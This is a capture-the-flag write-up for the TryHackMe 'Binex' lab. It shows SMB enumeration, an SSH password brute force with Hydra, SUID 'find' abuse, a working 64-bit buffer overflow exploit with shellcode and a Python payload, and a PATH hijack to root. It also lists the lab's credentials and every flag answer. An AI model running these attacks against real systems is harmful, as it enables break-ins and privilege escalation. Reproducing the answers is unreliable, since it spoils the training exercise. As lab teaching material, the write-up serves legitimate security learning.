# Binex

Escalate your privileges by exploiting vulnerable binaries.

[Binex](https://tryhackme.com/room/binex)

## Topic's

- Network Enumeration
- Linux Enumeration
- SMB Enumeration
- Brute Forcing (SSH)
- Abusing SUID/GUID
- Buffer Overflow
- Exploiting PATH Variable

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Gain initial access

Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.

There are more points up for grabs in this room.

```
kali@kali:~/CTFs/tryhackme/Binex$ sudo nmap -p- -Pn -sS -sC -sV -O 10.10.45.117
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 17:41 CEST
Nmap scan report for 10.10.45.117
Host is up (0.037s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
|_  256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=40819%PV=Y%DS=2%DC=I%G=Y%TM=5F847A
OS:BB%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=101%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2
OS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: thm_exploit
|   NetBIOS computer name: THM_EXPLOIT\x00
|   Domain name: \x00
|   FQDN: thm_exploit
|_  System time: 2020-10-12T15:48:09+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-12T15:48:09
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 428.31 seconds
```

```
kali@kali:~/CTFs/tryhackme/Binex$ enum4linux -a 10.10.45.117
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 12 17:48:37 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.45.117
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.45.117    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP

 ============================================
|    Nbtstat Information for 10.10.45.117    |
 ============================================
Looking up status of 10.10.45.117
        THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
        THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
        THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 =====================================
|    Session Check on 10.10.45.117    |
 =====================================
[+] Server 10.10.45.117 allows sessions using username '', password ''

 ===========================================
|    Getting domain SID for 10.10.45.117    |
 ===========================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================
|    OS information on 10.10.45.117    |
 ======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.45.117 from smbclient:
[+] Got OS info for 10.10.45.117 from srvinfo:
        THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================
|    Users on 10.10.45.117    |
 =============================
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================
|    Share Enumeration on 10.10.45.117    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.45.117
//10.10.45.117/print$   Mapping: DENIED, Listing: N/A
//10.10.45.117/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================
|    Password Policy Information for 10.10.45.117    |
 ====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.10.45.117 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Missing required parameter 'digestmod'.

[+] Trying protocol 445/SMB...

        [!] Protocol failed: Missing required parameter 'digestmod'.


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =======================================================================
|    Users on 10.10.45.117 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''
S-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\nobody (Local User)
S-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\None (Domain Group)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
enum4linux complete on Mon Oct 12 17:53:18 2020
```

- kel
- des
- tryhackme
- noentry

```
kali@kali:~/CTFs/tryhackme/Binex$ smbclient -L 10.10.45.117 -U anomymous
Enter WORKGROUP\anomymous's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
```

```
kali@kali:~/CTFs/tryhackme/Binex$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://10.10.45.117
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 17:55:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.45.117:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[STATUS] 134.33 tries/min, 403 tries in 00:03h, 14343998 to do in 1779:40h, 16 active
[STATUS] 116.86 tries/min, 818 tries in 00:07h, 14343583 to do in 2045:45h, 16 active
[22][ssh] host: 10.10.45.117   login: tryhackme   password: thebest
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 18:03:00
```

1. What are the login credential for initial access. Answer format should be in username:password

`tryhackme:thebest`

## Task 2 SUID :: Binary 1

Read the flag.txt from des's home directory.

```
tryhackme@THM_exploit:~$ find / -type f -perm -u=s -user des -ls 2> /dev/null
   262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find
tryhackme@THM_exploit:~$ ls -la /usr/bin/find
-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find
```

[https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)

```
tryhackme@THM_exploit:~$ find . -exec /bin/bash -p \; -quit
bash-4.4$ whoami
des
bash-4.4$ cd /home/des/
bash-4.4$ ls -la
total 52
drwx------ 4 des  des  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root 1740 Jan 12  2020 .bash_history
-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 des  des  3771 Apr  4  2018 .bashrc
-rwsr-xr-x 1 kel  kel  8600 Jan 17  2020 bof
-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
drwx------ 2 des  des  4096 Jan 12  2020 .cache
-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
drwx------ 3 des  des  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile
bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
```

`username: des password: destructive_72656275696c64`

1. What is the contents of /home/des/flag.txt?

`THM{exploit_the_SUID}`

## Task 3 Buffer Overflow :: Binary 2

Read the flag.txt from kel's home directory.

If you are stuck, here are the hints for the exploit.

- **Hint 1**: Step to overflow 64-bits buffer
  - **Step 1**: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from Metasploit)
  - **Step 2**: Read and copy the value from register RBP for the offset.
  - **Step 3**: Calculate the offset. (use pattern_offset.rb from Metasploit)
  - **Step 4**: Try control the register RIP with the following payload Junk\*(offset value) + 8 bytes of dummy
  - **Step 5**: Read the stack or register RSP to find a suitable return address.
  - **Step 6**: The general payload should be like below Nop + shellcode + Junks + return address
- **Hint 2**: Working shellcode `\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`
- **Hint 3**: Running the payload with the binary `(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number) +(return address))";cat) | ./bof64`

For your information, the Gnu debugger or gdb is installed with the machine. Happy hunting!

```
des@THM_exploit:~$ ./bof
Enter some string:
test
You entered: test
des@THM_exploit:~$ file bof
bof: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4a53f62986d7ff151cb42f0bdf26ce36c28ca5dd, not stripped
```

```
kali@kali:~/CTFs/tryhackme/Binex$ cat bof64.c
```

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
        char buffer[600];
        int characters_read;
        printf("Enter some string:\n");
        characters_read = read(0, buffer, 1000);
        printf("You entered: %s", buffer);
        return 0;
}

void main(){
        setresuid(geteuid(), geteuid(), geteuid());
        setresgid(getegid(), getegid(), getegid());

        foo();
}
```

```
des@THM_exploit:~$ echo $(python -c 'print("A" * 650)') | ./bof
Enter some string:
Segmentation fault (core dumped)
```

```py
from struct import pack
#buf="\xcc"*8
buf="\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload="\x90"*400
payload += buf
payload += "A" * (208 -len(buf))
payload += "B" *8
payload += pack("<Q", 0x7fffffffe300)

print payload
```

```
des@THM_exploit:~$ python exploit.py >testdes@THM_exploit:~$ (cat test;cat) | ./bof Enter some string:
id
uid=1000(kel) gid=1001(des) groups=1001(des)
pwd
/home/des
cd /home/kel
ls -la
total 52
drwx------ 4 kel  kel  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root   16 Jan 12  2020 .bash_history
-rw-r--r-- 1 kel  kel   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kel  kel  3771 Apr  4  2018 .bashrc
drwx------ 2 kel  kel  4096 Jan 12  2020 .cache
drwx------ 3 kel  kel  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 kel  kel   807 Apr  4  2018 .profile
-rwsr-xr-x 1 root root 8392 Jan 17  2020 exe
-rw-r--r-- 1 root root   76 Jan 17  2020 exe.c
-rw------- 1 kel  kel   118 Jan 17  2020 flag.txt
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```

1. What is the contents of /home/kel/flag.txt?

`THM{buffer_overflow_in_64_bit}`

## Task 4 PATH Manipulation :: Binary 3

Get the root flag from the root directory. This will require you to understand how the PATH variable works.

```
cd /tmp
ls
systemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-resolved.service-qGxTHc  systemd-private-0f779aad101b42e0b596cddf443aa30f-systemd-timesyncd.service-Aj3keJ
echo "/bin/bash" > ps
chmod +x ps
export PATH=/tmp:$PATH
cd /home/kel
./exe
id
uid=0(root) gid=0(root) groups=0(root),1001(des)
cat /root/root.txt
The flag: THM{SUID_binary_and_PATH_exploit}.
Also, thank you for your participation.

The room is built with love. DesKel out.
```

1. What is the contents of /root/root.txt?

`THM{SUID_binary_and_PATH_exploit}`
